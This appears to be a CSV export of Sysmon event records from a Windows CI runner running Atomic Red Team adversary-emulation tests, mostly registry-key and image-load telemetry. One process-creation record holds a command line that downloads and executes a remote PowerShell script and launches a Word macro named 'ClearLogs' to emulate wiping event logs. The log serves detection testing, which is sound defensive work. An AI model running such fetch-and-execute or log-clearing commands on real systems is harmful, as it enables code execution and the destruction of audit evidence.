"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.985
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.983
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.983
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.983
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.983
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:28.905
ProcessGuid: {f995aebf-6880-6942-5d08-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.534
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:23:28.435
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.403
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:23:28.380
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rkbtmhje.32f.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\trust
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.370
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\trust
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.368
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.368
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.368
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.368
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.368
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.366
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.366
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.366
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.364
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.364
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.364
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.364
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:23:28.360
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:23:28.358
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rkbtmhje.32f.ps1
CreationUtcTime: 2025-12-17 08:23:28.358
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.350
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.350
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.350
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.350
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
